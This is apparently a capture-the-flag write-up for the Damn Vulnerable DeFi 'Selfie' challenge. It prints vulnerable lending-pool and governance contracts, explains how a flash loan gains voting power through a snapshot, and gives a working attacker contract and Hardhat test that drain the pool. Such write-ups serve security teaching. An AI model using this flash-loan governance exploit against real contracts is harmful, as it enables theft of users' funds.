# Damn Vulnerable Defi: 6. Selfie

> A new cool lending pool has launched! It's now offering flash loans of DVT tokens.
> Wow, and it even includes a really fancy governance mechanism to control it.
> What could go wrong, right ?
> You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

**Objective of CTF:**

- Steal all ETH in the pool.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./common/DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {
  using Address for address;

  ERC20Snapshot public token;
  SimpleGovernance public governance;

  event FundsDrained(address indexed receiver, uint256 amount);

  modifier onlyGovernance() {
    require(msg.sender == address(governance), "Only governance can execute this action");
    _;
  }

  constructor(address tokenAddress, address governanceAddress) {
    token = ERC20Snapshot(tokenAddress);
    governance = SimpleGovernance(governanceAddress);
  }

  function flashLoan(uint256 borrowAmount) external nonReentrant {
    uint256 balanceBefore = token.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    token.transfer(msg.sender, borrowAmount);

    require(msg.sender.isContract(), "Sender must be a deployed contract");
    msg.sender.functionCall(abi.encodeWithSignature("receiveTokens(address,uint256)", address(token), borrowAmount));

    uint256 balanceAfter = token.balanceOf(address(this));

    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
  }

  function drainAllFunds(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit FundsDrained(receiver, amount);
  }
}

/**
 * @title SimpleGovernance
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SimpleGovernance {
  using Address for address;

  struct GovernanceAction {
    address receiver;
    bytes data;
    uint256 weiAmount;
    uint256 proposedAt;
    uint256 executedAt;
  }

  DamnValuableTokenSnapshot public governanceToken;

  mapping(uint256 => GovernanceAction) public actions;
  uint256 private actionCounter;
  uint256 private ACTION_DELAY_IN_SECONDS = 2 days;

  event ActionQueued(uint256 actionId, address indexed caller);
  event ActionExecuted(uint256 actionId, address indexed caller);

  constructor(address governanceTokenAddress) {
    require(governanceTokenAddress != address(0), "Governance token cannot be zero address");
    governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
    actionCounter = 1;
  }

  function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
    require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
    require(receiver != address(this), "Cannot queue actions that affect Governance");

    uint256 actionId = actionCounter;

    GovernanceAction storage actionToQueue = actions[actionId];
    actionToQueue.receiver = receiver;
    actionToQueue.weiAmount = weiAmount;
    actionToQueue.data = data;
    actionToQueue.proposedAt = block.timestamp;

    actionCounter++;

    emit ActionQueued(actionId, msg.sender);
    return actionId;
  }

  function executeAction(uint256 actionId) external payable {
    require(_canBeExecuted(actionId), "Cannot execute this action");

    GovernanceAction storage actionToExecute = actions[actionId];
    actionToExecute.executedAt = block.timestamp;
    actionToExecute.receiver.functionCallWithValue(actionToExecute.data, actionToExecute.weiAmount);

    emit ActionExecuted(actionId, msg.sender);
  }

  function getActionDelay() public view returns (uint256) {
    return ACTION_DELAY_IN_SECONDS;
  }

  /**
   * @dev an action can only be executed if:
   * 1) it's never been executed before and
   * 2) enough time has passed since it was first proposed
   */
  function _canBeExecuted(uint256 actionId) private view returns (bool) {
    GovernanceAction memory actionToExecute = actions[actionId];
    return (actionToExecute.executedAt == 0 &&
      (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS));
  }

  function _hasEnoughVotes(address account) private view returns (bool) {
    uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
    uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
    return balance > halfTotalSupply;
  }
}
```

## The Attack

There are two parts to this challenge: **pool** & **governance**. The thing is, pool can be drained by the governance, as shown in `drainAllFunds` function with the `onlyGovernance` modifier. As this relationship suggests, we must somehow pass a proposition via the governance to call `drainAllFunds`. So, how does the governance work?

Propositions take place in two steps:

1. **Queue**: To queue an action you need to have enough votes, which in this case is at least half the total supply of the governance contract. Once an action is queued, we move on to the next step.
2. **Execute**: A queued action can be executed if it passes the requirements written at `_canBeExecuted` private function. These requirements are that it must have passed enough time since this action was queued, and it's never been executed before.

"Time" is usually a method of preventing flash loan attacks, since flash loans live within a single transaction and passing time in one is not possible. However, there is a catch in this challenge: time only needs to pass after an action is queued, there is no protection against a flash loan attack towards `queueAction`!

At this point, it makes a lot of sense to take a flash loan, buy some voting rights, vote to withdraw the bank, and then pay back your loan. What matters is that this action gets queued, after which point we just have to wait enough (2 days in this challenge) and then execute the action.

Note that the governance contract uses an ERC20 snapshot within. So, we must call the public `snapshot` function there during our attack, so that our loaned balance may be seen by `queueAction` function.

## Proof of Concept

Here is our attacker contract, tasked with taking a loan and queueing the drain action.

```solidity
contract SelfieAttacker {
  address private immutable owner;
  SimpleGovernance private immutable governance;
  SelfiePool private immutable pool;
  DamnValuableTokenSnapshot private immutable tokenSnapshot;
  uint256 public actionId;

  constructor(address governance_, address pool_) {
    governance = SimpleGovernance(governance_);
    pool = SelfiePool(pool_);
    tokenSnapshot = SimpleGovernance(governance_).governanceToken();
    owner = msg.sender;
  }

  function receiveTokens(address token, uint256 amount) external {
    // ensure the sender is correct
    require(msg.sender == address(pool), "must be pool");
    // ensure token address is correct
    require(token == address(tokenSnapshot), "must be the correct token");

    // take snapshot while you have the balance
    tokenSnapshot.snapshot();

    // with the tokens now snapshotted, we queue an action
    // action will be made towards the loan itself, it will be a call to `drainAllFunds(address receiver)`
    // the receiver will be you of course :)
    actionId = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);

    // pay back your loan
    tokenSnapshot.transfer(address(pool), amount);
  }

  function pwn() external {
    // take their entire balance as a loan, why not
    pool.flashLoan(tokenSnapshot.balanceOf(address(pool)));
    // receiveTokens will be called as a result
  }
}
```

A proof of concept Hardhat test is given below:

```ts
describe('Damn Vulnerable Defi 6: Selfie', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let token: DamnValuableTokenSnapshot;
  let governance: SimpleGovernance;
  let pool: SelfiePool;

  const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    token = await ethers
      .getContractFactory('DamnValuableTokenSnapshot', owner)
      .then(f => f.deploy(TOKEN_INITIAL_SUPPLY));
    governance = await ethers.getContractFactory('SimpleGovernance', owner).then(f => f.deploy(token.address));
    pool = await ethers.getContractFactory('SelfiePool', owner).then(f => f.deploy(token.address, governance.address));

    // put tokens in the pool
    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
  });

  it('should drain tokens from the pool', async () => {
    const attackerContract = await ethers
      .getContractFactory('SelfieAttacker', attacker)
      .then(f => f.deploy(governance.address, pool.address));

    // pwn by taking a flash loan & queueing your action
    await attackerContract.connect(attacker).pwn();
    const actionId = await attackerContract.connect(attacker).actionId();

    // confirm that aciton is queued
    const action = await governance.connect(attacker).actions(actionId);
    expect(action.receiver).to.eq(pool.address); // just this check is enough

    // wait for 2 days for the action to be executable
    await fastForward({d: 2});

    // execute action
    await governance.connect(attacker).executeAction(actionId);
  });

  after(async () => {
    // attacker has taken all tokens from the pool
    expect(await token.balanceOf(attacker.address)).to.be.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.be.equal(0);
  });
});
```
